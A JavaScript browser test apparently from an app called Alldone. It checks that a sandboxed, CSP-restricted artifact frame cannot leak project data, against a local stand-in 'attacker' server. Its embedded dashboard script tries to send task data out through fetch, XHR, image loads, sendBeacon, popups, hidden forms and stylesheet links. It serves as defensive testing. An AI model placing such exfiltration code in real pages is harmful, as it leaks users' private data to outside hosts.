'use strict'

// The live data bridge, in real Chromium (functions/Artifacts/artifactDataBridge.js).
//
// A data-bound artifact gets project data handed to it, so the promise is that the data has no
// silent way out: framed at the bridge address, the page can run its own script and the bridge
// script, can talk to the app through postMessage, and can make no network request at all. jsdom
// cannot test any of this — it lives in how Chromium applies the CSP serveArtifact sends — so this
// drives the REAL serveArtifact handler (with in-memory Firestore and Storage) on one origin, a
// stand-in app page on a second origin and an "attacker" server on a third, and records every
// request the attacker receives.
//
// The app side here is a few lines that do what useArtifactDataBridge does (answer only the
// frame's own window and only the document that said hello first); the hook itself is covered by
// components/ArtifactsView/useArtifactDataBridge.test.js. The CONTROL page is the same artifact
// framed the ordinary way, and must reach the attacker — otherwise "blocked" would prove nothing.
//
//   node browser-tests/artifacts/bridge.js        exit code 0 = pass

const fs = require('fs')
const http = require('http')
const path = require('path')
const { createRequire } = require('module')
const { chromium } = require('playwright')

const REPO = path.join(__dirname, '..', '..')
const functionsRequire = createRequire(path.join(REPO, 'functions', 'package.json'))
const express = functionsRequire('express')
const { KnowledgeFirestoreDouble } = require(
    path.join(REPO, 'functions/KnowledgeBase/__fixtures__/knowledgeFirestoreDouble')
)
const { ArtifactBucketDouble } = require(path.join(REPO, 'functions/Artifacts/__fixtures__/artifactBucketDouble'))
const { commitArtifactVersion } = require(path.join(REPO, 'functions/Artifacts/artifactStore'))
const { handleServeArtifactRequest } = require(path.join(REPO, 'functions/Artifacts/serveArtifact'))
const { buildArtifactServeUrl } = require(path.join(REPO, 'functions/Artifacts/artifactModel'))
const { ARTIFACT_BRIDGE_PROTOCOL, ARTIFACT_BRIDGE_QUERY_PARAM, ARTIFACT_BRIDGE_SANDBOX } = require(
    path.join(REPO, 'functions/Artifacts/artifactDataBridge')
)

const PROJECT_ID = 'project-a'
const SECRET = 'bridge-secret-aaaaaaaaaaaaaaaaaaaa'
const SHARED_DATA = 'TASK-TITLE-only-for-project-members'

// The sandbox the app frames an ordinary artifact with, read from the component itself.
const previewSource = fs.readFileSync(path.join(REPO, 'components/ArtifactsView/ArtifactPreview.js'), 'utf8')
const sandboxMatch = previewSource.match(/ARTIFACT_IFRAME_SANDBOX\s*=\s*\n?\s*'([^']+)'/)
if (!sandboxMatch) throw new Error('Could not read ARTIFACT_IFRAME_SANDBOX from ArtifactPreview.js')
const ORDINARY_SANDBOX = sandboxMatch[1]

// The dashboard: asks for data, then tries every way out it can think of, then reports to the app.
const dashboardScript = exfil => `
(async function () {
    var out = { available: !!(window.alldone && window.alldone.available) }
    try { out.project = await alldone.project() } catch (e) { out.projectError = e.message }
    try { out.tasks = await alldone.tasks({ status: 'done' }) } catch (e) { out.tasksError = e.message }
    var data = encodeURIComponent(JSON.stringify(out.tasks || 'none'))
    try { await fetch('${exfil}/fetch?d=' + data); out.fetch = 'sent' } catch (e) { out.fetch = 'blocked' }
    try {
        var xhr = new XMLHttpRequest(); xhr.open('GET', '${exfil}/xhr?d=' + data); xhr.send(); out.xhr = 'attempted'
    } catch (e) { out.xhr = 'blocked' }
    await new Promise(function (resolve) {
        var img = new Image()
        img.onload = function () { out.img = 'sent'; resolve() }
        img.onerror = function () { out.img = 'failed'; resolve() }
        img.src = '${exfil}/img?d=' + data
    })
    try { out.beacon = String(navigator.sendBeacon('${exfil}/beacon', data)) } catch (e) { out.beacon = 'blocked' }
    try { out.popup = window.open('${exfil}/popup?d=' + data) ? 'opened' : 'blocked' } catch (e) { out.popup = 'blocked' }
    try {
        var form = document.createElement('form'); form.method = 'GET'; form.action = '${exfil}/form'
        form.target = 'hidden-form-target'
        var field = document.createElement('input'); field.name = 'd'; field.value = data; form.appendChild(field)
        document.body.appendChild(form); form.submit(); out.form = 'attempted'
    } catch (e) { out.form = 'blocked' }
    try {
        var link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '${exfil}/css?d=' + data
        document.head.appendChild(link); out.css = 'attempted'
    } catch (e) { out.css = 'blocked' }
    await new Promise(function (resolve) { setTimeout(resolve, 800) })
    parent.postMessage({ type: 'report', page: 'dashboard', out: out }, '*')
    // Last, navigate to a second page of the same artifact, which asks again.
    if (location.search.indexOf('${ARTIFACT_BRIDGE_QUERY_PARAM}') >= 0) location.href = 'second.html?${ARTIFACT_BRIDGE_QUERY_PARAM}=1'
})()
`

const SECOND_PAGE_SCRIPT = `
(async function () {
    var out = {}
    try {
        var answer = await Promise.race([
            alldone.project(),
            new Promise(function (_, reject) { setTimeout(function () { reject(new Error('no answer')) }, 2500) })
        ])
        out.answered = true
        out.project = answer
    } catch (e) { out.answered = false; out.error = e.message }
    parent.postMessage({ type: 'report', page: 'second', out: out }, '*')
})()
`

async function seed(db, bucket, exfil) {
    const ids = ['dashboard', 'dashboard-v1']
    const b64 = text => Buffer.from(text).toString('base64')
    await commitArtifactVersion({
        db,
        bucket,
        newId: () => ids.shift(),
        newSecret: () => SECRET,
        userId: 'owner',
        projectId: PROJECT_ID,
        dataAccess: true,
        files: [
            {
                path: 'index.html',
                base64: b64(
                    '<!doctype html><head><title>dashboard</title></head><body>' +
                        '<iframe name="hidden-form-target" style="display:none"></iframe>' +
                        '<script src="_alldone/bridge.js"></script><script src="app.js"></script></body>'
                ),
            },
            { path: 'app.js', base64: b64(dashboardScript(exfil)) },
            {
                path: 'second.html',
                base64: b64(
                    '<!doctype html><body><script src="_alldone/bridge.js"></script>' +
                        `<script>${SECOND_PAGE_SCRIPT}</script></body>`
                ),
            },
        ],
    })
}

function listen(app, host) {
    return new Promise(resolve => {
        const server = http.createServer(app).listen(0, host, () => resolve(server))
    })
}

function check(results, name, condition, detail) {
    results.push({ name, pass: !!condition, detail })
}

// The stand-in app: frames the artifact and answers like useArtifactDataBridge.
function appPage(frameUrl, sandbox) {
    return `<!doctype html><title>Alldone app</title><body>
<iframe id="artifact" sandbox="${sandbox}" referrerpolicy="no-referrer"></iframe>
<script>
    window.__reports = []
    window.__loads = 0
    window.__answered = []
    var session = null
    var ended = false
    var frame = document.getElementById('artifact')
    frame.addEventListener('load', function () { window.__loads += 1 })
    window.addEventListener('message', function (event) {
        if (event.source !== frame.contentWindow) return
        var data = event.data
        if (data && data.type === 'report') { window.__reports.push(data); return }
        if (!data || data.protocol !== '${ARTIFACT_BRIDGE_PROTOCOL}' || ended || window.__loads > 1) return
        if (data.type === 'hello') {
            if (session) { ended = true; return }
            session = 'session-' + Math.random().toString(16).slice(2)
            frame.contentWindow.postMessage({ protocol: '${ARTIFACT_BRIDGE_PROTOCOL}', type: 'welcome', session: session }, '*')
            return
        }
        if (data.type !== 'query' || data.session !== session) return
        var result = data.name === 'project'
            ? { id: '${PROJECT_ID}', name: 'Product' }
            : [{ id: 't1', title: '${SHARED_DATA}', done: true }]
        window.__answered.push({ name: data.name, origin: event.origin })
        frame.contentWindow.postMessage({ protocol: '${ARTIFACT_BRIDGE_PROTOCOL}', type: 'result', id: data.id, result: result }, '*')
    })
    frame.src = ${JSON.stringify(frameUrl)}
</script>
</body>`
}

async function main() {
    const db = new KnowledgeFirestoreDouble({ [`projects/${PROJECT_ID}`]: { userIds: ['owner'] } })
    const bucket = new ArtifactBucketDouble()

    const hits = []
    const attacker = express()
    attacker.use((req, res) => {
        hits.push(req.path)
        res.set('Access-Control-Allow-Origin', '*')
        res.send('ok')
    })
    const attackerServer = await listen(attacker, '127.0.0.2')
    const exfil = `http://127.0.0.2:${attackerServer.address().port}`
    await seed(db, bucket, exfil)

    const artifactApp = express()
    artifactApp.use((req, res) => handleServeArtifactRequest(req, res, { db, bucket, now: Date.now() }))
    const artifactServer = await listen(artifactApp, '127.0.0.1')
    const artifactOrigin = `http://127.0.0.1:${artifactServer.address().port}`
    const entry = buildArtifactServeUrl(artifactOrigin, {
        projectId: PROJECT_ID,
        artifactId: 'dashboard',
        serveSecret: SECRET,
        path: 'index.html',
    })

    const appApp = express()
    appApp.get('/bridged', (req, res) =>
        res.type('html').send(appPage(`${entry}?${ARTIFACT_BRIDGE_QUERY_PARAM}=1`, ARTIFACT_BRIDGE_SANDBOX))
    )
    appApp.get('/control', (req, res) => res.type('html').send(appPage(entry, ORDINARY_SANDBOX)))
    const appServer = await listen(appApp, 'localhost')
    const appOrigin = `http://localhost:${appServer.address().port}`

    const results = []
    const browser = await chromium.launch()
    try {
        const csp = (await fetch(`${entry}?${ARTIFACT_BRIDGE_QUERY_PARAM}=1`)).headers.get('content-security-policy')
        check(results, 'the bridge address is served with the locked-down policy', /connect-src 'none'/.test(csp), csp)

        // 1. Framed for the bridge.
        const page = await browser.newPage()
        page.on('console', message => process.env.VERBOSE && console.log('[browser]', message.text()))
        await page.goto(`${appOrigin}/bridged`)
        await page.waitForFunction(() => window.__reports.length >= 2, null, { timeout: 20000 })
        await page.waitForTimeout(500)
        const reports = await page.evaluate(() => window.__reports)
        const answered = await page.evaluate(() => window.__answered)
        const dashboard = reports.find(report => report.page === 'dashboard').out
        const second = reports.find(report => report.page === 'second').out

        check(results, 'the bridge script loads under the policy', dashboard.available === true, dashboard)
        check(results, 'the page gets its data through the app', dashboard.tasks?.[0]?.title === SHARED_DATA, dashboard)
        check(results, 'the app sees the page as an opaque origin', answered[0]?.origin === 'null', answered)
        check(results, 'fetch cannot reach another site', dashboard.fetch === 'blocked', dashboard.fetch)
        check(results, 'an image cannot reach another site', dashboard.img === 'failed', dashboard.img)
        check(results, 'a popup cannot be opened', dashboard.popup === 'blocked', dashboard.popup)
        check(results, 'the app stops answering a page the frame navigated to', second.answered === false, second)
        check(results, 'the attacker received nothing from the bridged page', hits.length === 0, hits)

        // 2. Control: the same artifact framed the ordinary way does reach the attacker.
        hits.length = 0
        const control = await browser.newPage()
        await control.goto(`${appOrigin}/control`)
        await control.waitForFunction(() => window.__reports.length >= 1, null, { timeout: 20000 })
        await control.waitForTimeout(800)
        check(
            results,
            'control: without the bridge address the same page CAN reach the attacker',
            hits.some(hit => hit === '/fetch' || hit === '/img'),
            hits
        )
    } finally {
        await browser.close()
        artifactServer.close()
        appServer.close()
        attackerServer.close()
    }

    results.forEach(result =>
        console.log(
            `${result.pass ? 'PASS' : 'FAIL'}  ${result.name}${result.pass ? '' : `  ${JSON.stringify(result.detail)}`}`
        )
    )
    const failed = results.filter(result => !result.pass).length
    console.log(`\n${results.length - failed}/${results.length} checks passed`)
    process.exit(failed ? 1 : 0)
}

main().catch(error => {
    console.error(error)
    process.exit(1)
})
